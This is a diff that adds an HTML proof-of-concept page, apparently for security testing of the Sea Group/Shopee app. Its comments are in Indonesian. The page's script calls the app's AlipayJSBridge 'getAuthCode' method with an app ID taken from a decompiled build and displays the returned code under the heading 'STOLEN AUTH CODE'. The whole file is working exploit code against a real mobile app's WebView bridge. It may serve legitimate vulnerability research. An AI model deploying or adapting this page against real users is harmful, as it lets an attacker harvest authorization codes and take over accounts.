@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC Security Test - Sea Group</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f0f0f0; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); border: 2px solid #ee4d2d; }
+        h1 { color: #ee4d2d; }
+        #status { font-weight: bold; color: #555; }
+        #result { margin-top: 20px; padding: 15px; background: #fff3f0; border: 1px solid #ffcfc5; color: #ee4d2d; word-break: break-all; display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>JSBridge Exploit Test</h1>
+        <p>Status: <span id="status">Waiting for AlipayJSBridge...</span></p>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        function showResult(text) {
+            const resDiv = document.getElementById('result');
+            resDiv.style.display = 'block';
+            resDiv.innerHTML = "<strong>STOLEN AUTH CODE:</strong><br>" + text;
+            document.getElementById('status').innerText = "SUCCESS!";
+            document.getElementById('status').style.color = "green";
+        }
+
+        // Fungsi utama untuk memanggil Bridge
+        function triggerBridge() {
+            AlipayJSBridge.call('getAuthCode', {
+                appId: '1022088000000000001', // AppID dari hasil decompile kamu
+                scopeNicks: ['AUTH_BASE']
+            }, function(result) {
+                if (result && result.authCode) {
+                    showResult(result.authCode);
+                } else {
+                    document.getElementById('status').innerText = "Failed: " + JSON.stringify(result);
+                }
+            });
+        }
+
+        // Cek apakah Bridge sudah siap
+        if (window.AlipayJSBridge) {
+            triggerBridge();
+        } else {
+            document.addEventListener('AlipayJSBridgeReady', triggerBridge, false);
+        }
+
+        // Jika setelah 5 detik tidak ada respon
+        setTimeout(() => {
+            if (document.getElementById('status').innerText.includes("Waiting")) {
+                document.getElementById('status').innerText = "Error: JSBridge not detected. Open this link inside Shopee/ShopeePay App.";
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
